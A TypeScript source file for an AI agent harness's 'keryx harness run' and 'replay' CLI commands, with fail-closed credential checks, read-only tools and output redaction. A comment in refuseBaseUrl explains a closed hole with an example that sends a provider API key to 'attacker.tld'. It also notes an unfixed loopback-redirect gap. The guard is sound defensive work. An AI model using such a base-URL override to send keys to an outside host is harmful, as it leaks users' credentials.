// `keryx harness run` CLI command (flow 020, T6 / AC4).
//
// `harnessCommand` parses `run --provider <p> --model <m> [--base-url <url>]
// "<prompt>"`, selects the provider, assembles the W7 `runOffline` loop with
// real (or injected) clock/id deps + a read-only policy profile and the
// read-only metaproject tool set, and prints ONE JSON blob
// `{events, text, completion, evidence, tools}` as its LAST `console.log`.
//
// `<p>` is any provider the registry declares (`src/commands/providers.ts`):
// `fake`, `anthropic`, `ollama` and every OpenAI-compatible gateway. It used to
// be a literal three-name set here while `docs/docs/cli-reference.md` promised
// the gateways — defect D4 of the 2026-08-05 shell benchmark.
//
// Fail-closed posture: a provider that requires a credential, without that
// credential in `deps.env ?? process.env`, prints a clear message and RETURNS
// before any network, provider construction or `runOffline` call. Any thrown
// error from a live run is caught into a structured (non-throwing) result. This
// command NEVER persists managed flow state.
//
// Determinism: `fetch`/`clock`/`idSeq`/`env` are injectable via `deps` so a test
// invocation stays fully offline; a real CLI invocation supplies none and falls
// back to `globalThis.fetch` / wall-clock / a uuid sequence / `process.env`.

import { readFileSync, writeFileSync } from "node:fs";
import path from "node:path";
import { createHash, randomUUID } from "node:crypto";
import type { HarnessConfig } from "../harness/config";
import { buildHarnessScanner } from "../security/harness-scan";
import { makeProvider } from "../harness/provider/make-provider";
import type { NormalizedEvent, ProviderPort } from "../harness/provider/types";
import type { PolicyProfile } from "../harness/policy/types";
import { resolveLocalProfile } from "../harness/policy/profiles";
import { type RunDeps, type RunResult, runOffline } from "../harness/run/run";
import {
  buildReplayFixture,
  parseReplayFixture,
  parseRunRecord,
  replayOffline,
  toRunRecord,
} from "../harness/replay/replay";
import { ToolRegistry } from "../harness/tool/registry";
import type { ToolExecutorPort, ToolInvocation, ToolResult } from "../harness/tool/types";
import type { HarnessRunInput } from "../harness/types";
// R2 library modules the exec/extension/wave subcommands COMPOSE (reuse-only).
import { runContainedProcess } from "../harness/process/executor";
import type {
  ContainedCommand,
  ProcessAdapter,
  RunContainedProcessInput,
} from "../harness/process/executor";
import { RealProcessAdapter } from "../harness/process/real-process-adapter";
import { defaultSandboxProfile } from "../harness/process/sandbox/profile";
import type { SandboxProfile } from "../harness/process/sandbox/profile";
import { resolveSandboxAdapter } from "../harness/process/sandbox/detect";
import { setupNetworkRun, summarizeDecisions } from "../harness/process/sandbox/network-run";
import type { MaskedCredential } from "../harness/process/sandbox/network-run";
import type { ProxyDecision } from "../harness/process/sandbox/proxy";
import {
  buildDefaultMaskProviders,
  parseMaskModeStrict,
  resolveAllowedDomains,
  resolveMasksFromSandboxEnv,
  type MaskMode,
} from "../harness/process/sandbox/mask-resolve";
import { redactForPersistence, type ScanResult } from "../harness/evidence/redaction";
import { validateAgainstSchemaObject } from "../contracts/validator";
import { createMetaprojectAdapter } from "../harness/tool/metaproject-adapter";
import type { MetaprojectPort } from "../harness/tool/metaproject-port";
import { toToolDefinitions, METAPROJECT_OPERATIONS } from "../harness/tool/metaproject-operations";
import { builtinMetaprojectTools, makeKeryxRunner } from "../harness/tool/builtin/metaproject-tools";
import type { ToolDefinition } from "../harness/tool/types";
import { isLoopbackHost } from "../harness/mutation/guard";
import {
  OPENAI_COMPAT_PROVIDERS,
  credentialEnvKeyFor,
  isKnownProvider,
  knownProviderNames,
  providerByName,
} from "./providers";
import { envWithSavedApiKeys } from "../lib/shell-config";
import { realpathSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import type { BudgetReservation, ParentRemainingBudget } from "../harness/child/isolation";
import type { ToolRisk } from "../harness/tool/types";
import { registerExtension } from "../harness/extension/registry";
import type { CapabilityGrant, ExtensionManifest } from "../harness/extension/registry";
import { dispatchExtension, evaluateExtensionGrant } from "../harness/extension/execute";
import type { DispatchArtifactRef, DispatchExtensionInput } from "../harness/extension/execute";
import { planExtensionWave } from "../harness/extension/bound-wave";
import type { ExtensionWaveTask, PlanExtensionWaveInput } from "../harness/extension/bound-wave";
import { checkApproval } from "../harness/mutation/approval";
import type { ApprovalCheckInput } from "../harness/mutation/approval";
import type { ParsedChildResult } from "../harness/child/contract";
import type { Provenance } from "../harness/session/types";

/** realpath a path, falling back to the input if it cannot be resolved. */
function canonicalPath(p: string): string {
  try {
    return realpathSync(p);
  } catch {
    return p;
  }
}

/**
 * Build the default OS-contained real-subprocess adapter for `keryx harness
 * exec`: the v1 workspace-write + network-off sandbox around a real spawn.
 * Writable roots (cwd + session tmp) are canonicalized so a symlinked temp path
 * (macOS /var, /tmp) is matched by the launcher. Fails closed when the launcher
 * is missing unless KERYX_SANDBOX_ALLOW_UNSANDBOXED=1; opts out entirely on
 * KERYX_DANGEROUSLY_DISABLE_SANDBOX=1.
 */
function buildDefaultShellAdapter(
  cwd: string,
  env: Record<string, string | undefined>,
  profileOverride?: SandboxProfile,
): ProcessAdapter {
  const real = new RealProcessAdapter({ allowRealSubprocess: true });
  let profile =
    profileOverride ?? defaultSandboxProfile(canonicalPath(cwd), canonicalPath(tmpdir()), homedir());
  if (profileOverride === undefined && env.KERYX_DANGEROUSLY_DISABLE_SANDBOX === "1") {
    profile = { ...profile, mode: "danger-full-access", required: false };
  }
  const { adapter } = resolveSandboxAdapter(profile, real, {
    platform: process.platform,
    env,
    failIfUnavailable: env.KERYX_SANDBOX_ALLOW_UNSANDBOXED !== "1",
  });
  return adapter;
}

/**
 * Spec injected into `keryx harness extension` (a test injects it; a real CLI
 * invocation reads it from `--spec <path>` via `readFileSync`). Carries the
 * registry inputs, the optional escalation-grant inputs (fed to
 * `evaluateExtensionGrant` ONLY when `requestedCapabilities` is present), and
 * every field `dispatchExtension` needs, plus an optional `rawChildResult`.
 */
export interface ExtensionCliSpec {
  // Injected spec: an index signature keeps the frozen tests' `Record<string,
  // unknown>` spec objects assignable via their `as HarnessCommandDeps` cast.
  [key: string]: unknown;
  extensionId: string;
  manifest?: ExtensionManifest;
  capabilityGrant?: CapabilityGrant;
  requestedCapabilities?: string[];
  policyDecision?: "allow" | "ask" | "deny";
  provenance?: Provenance;
  approval?: ApprovalCheckInput;
  reservedBudget: BudgetReservation;
  parentRunId: string;
  sessionId: string;
  attempt: { attemptId: string; number: number };
  branchId: string;
  contextManifestHash: string;
  policyFingerprint: string;
  canonicalContractVersion: string;
  task: { title: string; description: string };
  acceptanceCriteria: string[];
  dispatchArtifact: DispatchArtifactRef;
  resultArtifact: DispatchArtifactRef;
  rawChildResult?: string | ParsedChildResult;
}

/** One task inside a {@link WaveCliSpec}: registry inputs + `ExtensionWaveTask` fields. */
export interface WaveCliTaskSpec {
  // Injected spec: an index signature keeps the frozen tests' `Record<string,
  // unknown>` task objects assignable via their `as HarnessCommandDeps` cast.
  [key: string]: unknown;
  taskId: string;
  dependsOn: string[];
  extensionId: string;
  manifest?: ExtensionManifest;
  capabilityGrant?: CapabilityGrant;
  budgetRequest: BudgetReservation;
  cancelled?: boolean;
  sessionId: string;
  attempt: { attemptId: string; number: number };
  branchId: string;
  contextManifestHash: string;
  policyFingerprint: string;
  task: { title: string; description: string };
  acceptanceCriteria: string[];
  dispatchArtifact: DispatchArtifactRef;
  resultArtifact: DispatchArtifactRef;
}

/** Spec injected into `keryx harness wave` (or read from `--spec <path>`). */
export interface WaveCliSpec {
  tasks: WaveCliTaskSpec[];
  maxConcurrency: number;
  parentRemaining: ParentRemainingBudget;
  parentRunId: string;
  canonicalContractVersion: string;
}

/** Injected, all-optional dependencies keeping a test run offline + deterministic. */
export interface HarnessCommandDeps {
  fetch?: typeof fetch;
  clock?: () => string;
  idSeq?: () => string;
  env?: Record<string, string | undefined>;
  /** Injected FAKE process adapter — keeps `exec` offline (never a real spawn). */
  processAdapter?: ProcessAdapter;
  /** Injected extension spec — keeps `extension` off the filesystem. */
  extensionSpec?: ExtensionCliSpec;
  /** Injected wave spec — keeps `wave` off the filesystem. */
  waveSpec?: WaveCliSpec;
  /**
   * Injected provider — lets a test drive `run` from a fixture transcript
   * without a network or a credential. A real CLI invocation supplies none and
   * `makeProvider` selects from `--provider`.
   */
  provider?: ProviderPort;
  /**
   * Injected metaproject read port backing the registered tools. A real CLI
   * invocation supplies none and `createMetaprojectAdapter(process.cwd())` reads
   * the workspace; a test supplies a fake so the run touches no graph on disk.
   */
  metaprojectPort?: MetaprojectPort;
  /**
   * Injected secret scanner. A real CLI invocation supplies none and
   * `buildHarnessScanner(process.cwd())` resolves the project's detectors.
   *
   * SCOPE: this replaces the scanner for the WHOLE run, not just the tool-output
   * path — the same function is handed to `runOffline` as `deps.scan` and is
   * what redaction-before-persistence uses for every tool result the session
   * records. It exists so the tool-output redaction branch can be exercised
   * without planting a real secret on disk, but a test that injects a permissive
   * stub has disabled redaction everywhere in that run, not in one branch.
   */
  scan?: (content: string) => ScanResult;
}

/** Resolve the shared runtime deps (env/clock/idSeq) with the run-path fallback. */
function resolveRuntime(deps?: HarnessCommandDeps): {
  env: Record<string, string | undefined>;
  clock: () => string;
  idSeq: () => string;
} {
  const env = deps?.env ?? process.env;
  const clock = deps?.clock ?? (() => new Date().toISOString());
  let idCounter = 0;
  const idSeq = deps?.idSeq ?? (() => `${randomUUID()}-${idCounter++}`);
  return { env, clock, idSeq };
}

/**
 * A `trusted-local` profile with `defaults.shell: "allow"` — the deterministic
 * "approved argv and environment allowlist" posture the frozen
 * SC_R04_SHELL_CONTAINMENT scenario describes (mirrors the shell-allow fixture
 * in `executor.test.ts`). Only reached behind the `exec` opt-in gate.
 *
 * The literal moved to `src/harness/policy/profiles.ts` when `keryx serve`
 * became the third consumer and needed a profile it could COMPARE against. This
 * is now a named alias over the resolver, kept so the call site below still
 * reads as what it selects rather than as a string.
 */
function shellAllowProfile(): PolicyProfile {
  return resolveLocalProfile("monitored-trusted-local");
}

/** The structured result the command prints as its final JSON blob. */
interface StructuredResult {
  events: NormalizedEvent[];
  text: string;
  completion: unknown;
  evidence: string[];
  /** Every registered tool the run executed, with its redacted output. */
  tools: HarnessToolRunRecord[];
}

interface ParsedArgs {
  provider: string;
  model: string;
  baseUrl?: string;
  prompt: string;
  /** `--record <path>`: write the run's replayable hash surface to a file. */
  record?: string;
  /** `--tools`: register the read-only metaproject tools for this run. */
  tools: boolean;
}

/**
 * The usage text, printed on an unknown subcommand or invalid args.
 *
 * The provider list is GENERATED from the registry rather than typed out. A
 * literal here would be a third place the set of accepted providers is written
 * down (after the validation set and `docs/docs/cli-reference.md`), and the
 * benchmark already found the first two disagreeing.
 */
const USAGE = [
  `Usage: keryx harness run --provider <${knownProviderNames().join("|")}> --model <m> [--base-url <url>] [--record <path>] [--tools] "<prompt>"`,
  "       keryx harness exec [--allow-env KEY]... [--max-runtime-ms N] [--allow-real-subprocess]",
      "         [--allowed-domains a,b] [--mask-env NAME@host] [--tls-terminate] [--mask-mode auto|manual|off] [--auto-mask]",
      "         -- <path> [args...]",
  "       keryx harness extension --spec <path>",
  "       keryx harness wave --spec <path>",
  "       keryx harness replay --record <path> [--fixture <path>] [--write-fixture <path>] [--json]",
].join("\n");

/** A read-only-review profile (defaults.read = "allow"), per policy-profile.schema.json. */
function readOnlyProfile(): PolicyProfile {
  return resolveLocalProfile("read-only-review");
}

/**
 * Whether `--base-url <url>` may be honoured for `provider`, and why not when it
 * may not. Returns the refusal text, or `undefined` when the base URL is allowed.
 *
 * The rule is one sentence: **`--base-url` is honoured only for `ollama`, and
 * only when it names a loopback host.** Two holes closed, both newly reachable
 * on the CI-facing surface because this command's accepted-provider set widened:
 *
 *  1. `--provider ollama --base-url https://any-public-host/` passed the
 *     credential gate (ollama needs no key) and then sailed through the
 *     provider's egress guard, which rejects private/loopback/link-local/
 *     metadata hosts but not arbitrary public ones. "ollama (loopback)" was
 *     documented containment that did not exist.
 *  2. `--provider deepseek --base-url https://attacker.tld` sent
 *     `Bearer $DEEPSEEK_API_KEY` to whatever host was named. The credential is
 *     chosen by the provider name and the destination was not, so the two could
 *     be pointed at different parties. A registry provider's base URL is part of
 *     its identity; it comes from the registry.
 *
 * Refusal rather than silent ignoring: a flag that is accepted and discarded
 * teaches the caller a false model of what ran.
 *
 * WHAT THIS DOES NOT COVER. It constrains the URL the flag names, not every
 * host the session can reach: nothing here sets `redirect: "manual"`, so a
 * process listening on loopback could answer with a 3xx and `fetch` would
 * follow it to a public host. The refusal messages therefore say what the FLAG
 * will not do, not what the session cannot do — an earlier draft said "this
 * command will not point it at a remote host", which was a claim about the
 * session and was not true.
 *
 * Left as-is deliberately. Reaching that redirect requires an attacker already
 * running a process on the user's loopback interface — i.e. local code
 * execution, at which point a redirect is not their cheapest option — and no
 * credential is attached to an ollama request, so the exposure is prompt text.
 * The fix belongs in the adapter (`OllamaProvider`), which every OpenAI-compat
 * gateway shares, and pinning `redirect: "manual"` there would break any
 * legitimate gateway that 3xx-es. That is a change with its own blast radius and
 * its own tests, not a rider on this one.
 */
export function refuseBaseUrl(provider: string, baseUrl: string): string | undefined {
  if (provider === "ollama") {
    let url: URL;
    try {
      url = new URL(baseUrl);
    } catch {
      return `--base-url ${baseUrl} is not a URL. The ollama provider accepts a loopback base URL only (e.g. http://127.0.0.1:11434).`;
    }
    // Scheme first: a loopback HOST is not the same as an HTTP destination, and
    // `file:`/`ftp:`/`data:` all parse to something with a hostname.
    if (url.protocol !== "http:" && url.protocol !== "https:") {
      return `--base-url ${baseUrl} uses the ${url.protocol.replace(":", "")} scheme; only http and https are accepted. No network was contacted.`;
    }
    if (!isLoopbackHost(url.hostname)) {
      return `--base-url ${baseUrl} names ${url.hostname}, which is not loopback. The ollama provider is a LOCAL runtime and this flag will not point it at a remote host; no network was contacted.`;
    }
    return undefined;
  }
  const registryProvider = providerByName(provider);
  if (registryProvider !== undefined) {
    return `--base-url is not accepted for ${provider}: its base URL (${registryProvider.baseUrl}) is part of the provider's identity, and overriding it would send ${registryProvider.envKey} to a host the registry never named. No network was contacted.`;
  }
  return `--base-url is not accepted for ${provider}; it is honoured only for ollama, and only for a loopback host.`;
}

/**
 * One executed tool call, as the CLI reports it.
 *
 * The harness `ToolResult` carries only an `outputHash` — enough to prove a
 * result existed, useless to whatever is reading this command's stdout. So the
 * executor keeps the (redacted) text alongside it and the command prints both.
 * Without this, "the non-interactive door registers tools" would be a claim only
 * a hash could support.
 */
export interface HarnessToolRunRecord {
  toolCallId: string;
  toolName: string;
  status: "succeeded" | "failed";
  /** The tool's output AFTER the redaction scan; never the raw protected text. */
  output: string;
}

/** Deterministic sha-256 hex of a string (matches the harness result hashing). */
function hashOutput(content: string): string {
  return createHash("sha256").update(content, "utf8").digest("hex");
}

/**
 * The executor paired with the EMPTY registry a run without `--tools` gets. The
 * registry gate already means no call can reach it; this is the fail-closed
 * floor if one ever did, and it never succeeds silently.
 */
const denyingExecutor: ToolExecutorPort = {
  invoke: async (invocation: ToolInvocation): Promise<ToolResult> => {
    throw new Error(
      `no tool executor is configured for this run: ${invocation.call.toolName} (pass --tools to register the read-only metaproject tools)`,
    );
  },
};

/**
 * The read-only metaproject tools, registered for a non-interactive run.
 *
 * This replaces the "Release 0 CLI runs register no tools" floor. It was not a
 * safety property — the interactive shell has registered the same read-only set
 * since flow 035 — it was an unfinished wiring: `toToolDefinitions` existed with
 * no production consumer, so `keryx harness run` could only ever complete a
 * single text turn (benchmark defect D3).
 *
 * Both halves are projections of the SAME `METAPROJECT_OPERATIONS` list:
 * `toToolDefinitions` gives the registry the durable definitions (schemas, risk,
 * limits), and `builtinMetaprojectTools` gives the executor the invocable side,
 * including the `search_code` subprocess fallback and its path confinement. They
 * are matched by operation name rather than by index, so neither projection can
 * silently drift into executing a different tool than the one registered.
 *
 * `toolId` is de-namespaced from `metaproject:<name>` to `<name>`: the toolId is
 * what the model is shown and what it must echo back, and a colon is not a legal
 * tool name for the Anthropic API. It also keeps the non-interactive names
 * identical to the interactive ones, so a prompt written for one door works on
 * the other.
 */
function buildMetaprojectTooling(
  cwd: string,
  scan: (content: string) => ScanResult,
  clock: () => string,
  port?: MetaprojectPort,
): { registry: ToolRegistry; executor: ToolExecutorPort; records: HarnessToolRunRecord[] } {
  const resolvedPort = port ?? createMetaprojectAdapter(cwd);
  const invocable = new Map(
    builtinMetaprojectTools(cwd, makeKeryxRunner(cwd), resolvedPort).map((tool) => [
      tool.definition.name,
      tool,
    ]),
  );

  const registry = new ToolRegistry();
  const definitions = new Map<string, ToolDefinition>();
  for (const namespaced of toToolDefinitions(METAPROJECT_OPERATIONS)) {
    const name = namespaced.toolId.replace(/^metaproject:/, "");
    if (!invocable.has(name)) continue;
    const definition: ToolDefinition = { ...namespaced, toolId: name };
    registry.register(definition);
    definitions.set(name, definition);
  }

  const records: HarnessToolRunRecord[] = [];

  const executor: ToolExecutorPort = {
    invoke: async (invocation: ToolInvocation): Promise<ToolResult> => {
      const { call } = invocation;
      const definition = definitions.get(call.toolName);
      const tool = invocable.get(call.toolName);
      if (definition === undefined || tool === undefined) {
        // The run loop turns a throw into a `tool-rejected` blocker with no
        // receipt, which is the correct record for a call that never ran.
        throw new Error(`tool "${call.toolName}" is not registered for the harness CLI`);
      }

      // The registered tool's own inline schema, checked in process. The
      // file-based `validateToolCall` gate is not used here because it needs the
      // frozen schema directory on disk, and an installed CLI has no reason to
      // ship one; these operation schemas carry no cross-file `$ref`, so nothing
      // is read from disk.
      const inputCheck = validateAgainstSchemaObject(definition.inputSchema, call.input);
      if (!inputCheck.valid) {
        const detail = inputCheck.errors.map((error) => `${error.path}: ${error.message}`).join("; ");
        throw new Error(`tool "${call.toolName}" received invalid input: ${detail}`);
      }

      const outcome = await tool.invoke(call.input);

      // Same redaction the run loop applies before persistence, applied before
      // the output reaches stdout. `search_code` can return file contents, and a
      // piped structured result is every bit as durable as a session record.
      const redaction = redactForPersistence(outcome.output, { scan });
      const output = redaction.blocked ? redaction.reason : redaction.preview;
      const status: "succeeded" | "failed" =
        outcome.isError || redaction.blocked ? "failed" : "succeeded";

      records.push({ toolCallId: call.toolCallId, toolName: call.toolName, status, output });

      return {
        schemaVersion: 1,
        toolResultId: `result-${call.toolCallId}`,
        executionId: `exec-${call.toolCallId}`,
        toolCallId: call.toolCallId,
        causal: { runId: call.runId, sessionId: call.sessionId, correlationId: call.toolCallId },
        status,
        outputHash: hashOutput(outcome.output),
        ...(status === "failed"
          ? { errorCode: redaction.blocked ? "redaction-blocked" : "tool-error" }
          : {}),
        redaction: redaction.blocked
          ? ("failed-safe" as const)
          : redaction.category === "none"
            ? ("not-needed" as const)
            : ("applied" as const),
        createdAt: clock(),
      };
    },
  };

  return { registry, executor, records };
}

/** Parse `run --provider <p> --model <m> [--base-url <url>] [--tools] "<prompt>"`. */
function parseArgs(args: string[]): ParsedArgs {
  let provider = "";
  let model = "";
  let baseUrl: string | undefined;
  let record: string | undefined;
  let tools = false;
  const positional: string[] = [];

  // args[0] is the "run" subcommand.
  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    if (arg === "--provider") {
      provider = args[++i] ?? "";
    } else if (arg === "--model") {
      model = args[++i] ?? "";
    } else if (arg === "--base-url") {
      baseUrl = args[++i];
    } else if (arg === "--record") {
      record = args[++i];
    } else if (arg === "--tools") {
      tools = true;
    } else if (arg !== undefined) {
      positional.push(arg);
    }
  }

  const parsed: ParsedArgs = { provider, model, prompt: positional.join(" "), tools };
  if (baseUrl !== undefined) parsed.baseUrl = baseUrl;
  if (record !== undefined) parsed.record = record;
  return parsed;
}

/** Fold the terminal `RunResult` into the printed structured result. */
function toStructured(result: RunResult, tools: HarnessToolRunRecord[]): StructuredResult {
  const text = result.events
    .filter((event) => event.kind === "text_delta")
    .map((event) => event.text ?? "")
    .join("");
  return {
    events: result.events,
    text,
    completion: result.output.gate,
    evidence: result.output.artifacts,
    tools,
  };
}

export async function harnessCommand(args: string[], deps?: HarnessCommandDeps): Promise<void> {
  const subcommand = args[0];
  if (subcommand === "exec") {
    await harnessExec(args, deps);
    return;
  }
  if (subcommand === "extension") {
    harnessExtension(args, deps);
    return;
  }
  if (subcommand === "wave") {
    harnessWave(args, deps);
    return;
  }
  if (subcommand === "replay") {
    harnessReplay(args, deps);
    return;
  }
  if (subcommand !== "run") {
    console.log(USAGE);
    return;
  }

  const { provider, model, baseUrl, prompt, record, tools } = parseArgs(args);

  // UX guard (flow 021, T5 / AC4): an invalid/empty --provider or an empty
  // prompt prints the usage line and returns BEFORE building input or running
  // runOffline — never a blocked/failed structured run result.
  //
  // The accepted set comes from the registry (flow 135 / D4). It used to be a
  // literal `["fake","anthropic","ollama"]`, which refused every OpenAI-compatible
  // gateway the shell offers and that `docs/docs/cli-reference.md` already told
  // the reader were accepted. Reading the registry means adding a provider there
  // is the whole change: no second list to remember.
  if (!isKnownProvider(provider) || prompt.length === 0) {
    console.log(USAGE);
    return;
  }

  // Destination guard, BEFORE the credential is read and before anything is
  // constructed: see `refuseBaseUrl`. A refused base URL is an argument error,
  // so it is reported ahead of the credential abort — a caller who typed a bad
  // destination should be told about the destination, not about a key.
  if (baseUrl !== undefined) {
    const refusal = refuseBaseUrl(provider, baseUrl);
    if (refusal !== undefined) {
      console.log(refusal);
      return;
    }
  }

  const env = deps?.env ?? process.env;
  const clock = deps?.clock ?? (() => new Date().toISOString());
  let idCounter = 0;
  const idSeq = deps?.idSeq ?? (() => `${randomUUID()}-${idCounter++}`);
  const fetchImpl = deps?.fetch ?? globalThis.fetch;

  // Fail-closed BEFORE any construction/network: a provider that needs a
  // credential aborts the whole command (prints + returns) when it is absent —
  // this command-level abort is distinct from the shell's fake fallback, so it
  // stays here rather than in the shared factory.
  //
  // The check is now per-provider rather than anthropic-only, because the guard
  // above just widened what `--provider` accepts. Accepting eight more gateways
  // while only anthropic could fail closed would have traded a usage error for a
  // credential-less run against a hosted endpoint — a strictly worse trade, and
  // the reason `credentialEnvKeyFor` lives beside the registry it is derived
  // from. `fake` (never opens a socket) and `ollama` (local runtime, no key)
  // need no credential; the destination guard above is what keeps the second one
  // local, since needing no key is not the same as reaching nowhere.
  const credentialEnvKey = credentialEnvKeyFor(provider);
  if (credentialEnvKey !== undefined) {
    const apiKey = env[credentialEnvKey];
    if (apiKey === undefined || apiKey.length === 0) {
      console.log(
        `${credentialEnvKey} is not set: the ${provider} provider is required to have a credential and fails closed (no network was contacted).`,
      );
      return;
    }
  }

  // Construction delegated to the shared factory (review-polish item B). "fake"
  // and any unrecognized name yield the offline W6 replay provider (no
  // transcripts wired in the CLI, so a missing-fixture match surfaces as a
  // caught structured result).
  const providerPort: ProviderPort =
    deps?.provider ??
    makeProvider(provider, model, {
      fetch: fetchImpl,
      env,
      ...(baseUrl !== undefined ? { baseUrl } : {}),
    });

  const input: HarnessRunInput = {
    schemaVersion: 1,
    request: prompt,
    projectRoot: process.cwd(),
    role: "build",
    policy: "read-only-review",
    budget: { maxSeconds: 60, maxToolCalls: 5, maxRetries: 1 },
    provider,
    model,
    // A local-only startup precondition (never schema-validated); its presence
    // lets startup proceed so the selected provider actually streams.
    credentialRef: provider === "anthropic" ? "anthropic-key" : `${provider}-local`,
  };
  const config: HarnessConfig = {
    schemaVersion: 1,
    enabled: true,
    defaultRole: "build",
    defaultProvider: provider,
    defaultModel: model,
    policyProfile: "read-only-review",
    limits: { maxRunSeconds: 300, maxConcurrentChildren: 1, maxToolOutputBytes: 65_536, maxRetries: 1 },
  };
  // The real content scanner for redaction-before-persistence. Resolved here,
  // once, because the run loop is synchronous and may not read the config from
  // inside itself; without it the loop falls back to a stub that finds nothing.
  const { scan } = deps?.scan !== undefined ? { scan: deps.scan } : await buildHarnessScanner(process.cwd());

  // Tool registration is OPT-IN (`--tools`), and the default is OFF.
  //
  // Not timidity — the loop it feeds is single-turn. `runOffline` opens exactly
  // one provider stream, executes whatever tools the model named, and returns;
  // the results are recorded under `tools` but never appended to the messages,
  // and there is no second request. So a model that is told about twelve tools
  // and stops on a tool call gets no answer back and produces little or no
  // text — degrading output for exactly the prompts tools were supposed to
  // help with. Advertising a capability the loop cannot complete is the same
  // over-promise this flow exists to remove, one layer down.
  //
  // Behind the flag it is honest and useful: the caller asked, the tool runs,
  // and its output is in the printed blob for a script to read. The default
  // flips when the loop learns to take a second turn, and this comment is the
  // note to whoever does that.
  const tooling = tools
    ? buildMetaprojectTooling(process.cwd(), scan, clock, deps?.metaprojectPort)
    : { registry: new ToolRegistry(), executor: denyingExecutor, records: [] as HarnessToolRunRecord[] };
  const runDeps: RunDeps = {
    provider: providerPort,
    toolRegistry: tooling.registry,
    toolExecutor: tooling.executor,
    policyProfile: readOnlyProfile(),
    clock,
    idSeq,
    interactive: false,
    scan,
  };

  let structured: StructuredResult;
  try {
    const result = await runOffline(input, config, runDeps);
    structured = toStructured(result, tooling.records);
    if (record !== undefined && record.length > 0) {
      // Written before the structured blob is printed, so a caller that pipes
      // stdout still gets the file, and a write failure surfaces as the error
      // it is rather than being swallowed after a "success" line.
      writeFileSync(
        record,
        `${JSON.stringify(
          toRunRecord(result, {
            runId: result.output.runId,
            status: result.output.status,
            recordedAt: result.output.startedAt,
          }),
          null,
          2,
        )}\n`,
        { encoding: "utf8", mode: 0o600 },
      );
    }
  } catch (error) {
    // Never let a live/replay failure escape as an uncaught exception: fold it
    // into a structured, non-throwing result.
    structured = {
      events: [],
      text: "",
      completion: { status: "failed", passed: false, reason: error instanceof Error ? error.message : String(error) },
      evidence: [],
      // Whatever ran before the failure is still reported: a tool that executed
      // and then a run that fell over is not the same thing as a run that did
      // nothing, and the caller cannot tell them apart from an empty blob.
      tools: tooling.records,
    };
  }

  console.log(JSON.stringify(structured));
}

// ---------------------------------------------------------------------------
// replay — validate a recorded run's log against a replay fixture.
// ---------------------------------------------------------------------------
//
// What this checks, precisely: that a fixture still describes the run it was
// built from. `mode` is always `validate-log`; nothing is re-executed, no
// provider or tool is contacted, and a run that would produce different output
// today is NOT what this detects. That is `simulate-recorded-results`, which
// Release 0 does not implement. The help text says the same thing, because the
// README once did not and it took an audit to notice.

interface ParsedReplayArgs {
  record?: string;
  fixture?: string;
  writeFixture?: string;
  json: boolean;
}

function parseReplayArgs(args: string[]): ParsedReplayArgs {
  const parsed: ParsedReplayArgs = { json: false };
  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    if (arg === "--record") {
      parsed.record = args[++i] ?? "";
    } else if (arg === "--fixture") {
      parsed.fixture = args[++i] ?? "";
    } else if (arg === "--write-fixture") {
      parsed.writeFixture = args[++i] ?? "";
    } else if (arg === "--json") {
      parsed.json = true;
    }
  }
  return parsed;
}

/** Read + JSON-parse a file, returning a typed failure rather than throwing. */
function readJsonFile(file: string): { ok: true; value: unknown } | { ok: false; reason: string } {
  let text: string;
  try {
    text = readFileSync(file, "utf8");
  } catch (error) {
    return { ok: false, reason: error instanceof Error ? error.message : String(error) };
  }
  try {
    return { ok: true, value: JSON.parse(text) as unknown };
  } catch (error) {
    return { ok: false, reason: `not valid JSON (${error instanceof Error ? error.message : String(error)})` };
  }
}

export function harnessReplay(args: string[], deps?: HarnessCommandDeps): void {
  const parsed = parseReplayArgs(args);
  if (parsed.record === undefined || parsed.record.length === 0) {
    console.log(USAGE);
    process.exitCode = 1;
    return;
  }

  const recordRead = readJsonFile(parsed.record);
  if (!recordRead.ok) {
    console.error(`Cannot read run record ${parsed.record}: ${recordRead.reason}`);
    process.exitCode = 1;
    return;
  }
  const run = parseRunRecord(recordRead.value);
  if (run === undefined) {
    console.error(
      `${parsed.record} is not a harness run record (expected runId plus the five recorded hashes; write one with \`keryx harness run --record\`).`,
    );
    process.exitCode = 1;
    return;
  }

  const clock = deps?.clock ?? (() => new Date().toISOString());
  let idCounter = 0;
  const idSeq = deps?.idSeq ?? (() => `${randomUUID()}-${idCounter++}`);

  // No `--fixture` means "build one from this record and check it round-trips".
  // It always matches, and saying so is the point: it is the baseline a later
  // comparison is made against, and `--write-fixture` is how it is kept.
  const fixture = (() => {
    if (parsed.fixture === undefined || parsed.fixture.length === 0) {
      return { ok: true as const, value: buildReplayFixture(run, { idSeq }), built: true };
    }
    const read = readJsonFile(parsed.fixture);
    if (!read.ok) {
      return { ok: false as const, reason: `Cannot read fixture ${parsed.fixture}: ${read.reason}` };
    }
    const parsedFixture = parseReplayFixture(read.value);
    if (parsedFixture === undefined) {
      return {
        ok: false as const,
        reason: `${parsed.fixture} is not a replay fixture (expected fixtureId, mode and the five hashes).`,
      };
    }
    return { ok: true as const, value: parsedFixture, built: false };
  })();

  if (!fixture.ok) {
    console.error(fixture.reason);
    process.exitCode = 1;
    return;
  }

  if (parsed.writeFixture !== undefined && parsed.writeFixture.length > 0) {
    writeFileSync(parsed.writeFixture, `${JSON.stringify(fixture.value, null, 2)}\n`, {
      encoding: "utf8",
      mode: 0o600,
    });
  }

  const outcome = replayOffline(fixture.value, run, { clock, idSeq });

  if (parsed.json) {
    console.log(
      JSON.stringify({
        schemaVersion: 1,
        mode: fixture.value.mode,
        runId: run.runId,
        fixtureId: fixture.value.fixtureId,
        fixtureSource: fixture.built ? "built-from-record" : parsed.fixture,
        ok: outcome.ok,
        ...(outcome.ok ? {} : { mismatch: outcome.mismatch }),
      }),
    );
  } else if (outcome.ok) {
    console.log(`Replay OK (${fixture.value.mode}): fixture ${fixture.value.fixtureId} matches run ${run.runId}.`);
    if (fixture.built) {
      console.log("Fixture was built from this record, so a match is expected; keep it with --write-fixture.");
    }
  } else {
    console.error(`Replay MISMATCH (${outcome.mismatch.kind}) on run ${run.runId}:`);
    console.error(`  ${outcome.mismatch.detail ?? "hash diverged"}`);
    console.error(`  expected ${outcome.mismatch.expectedHash}`);
    console.error(`  actual   ${outcome.mismatch.actualHash}`);
  }

  if (!outcome.ok) {
    process.exitCode = 1;
  }
}

// ---------------------------------------------------------------------------
// exec — a contained real subprocess, fail-closed and opt-in.
// ---------------------------------------------------------------------------

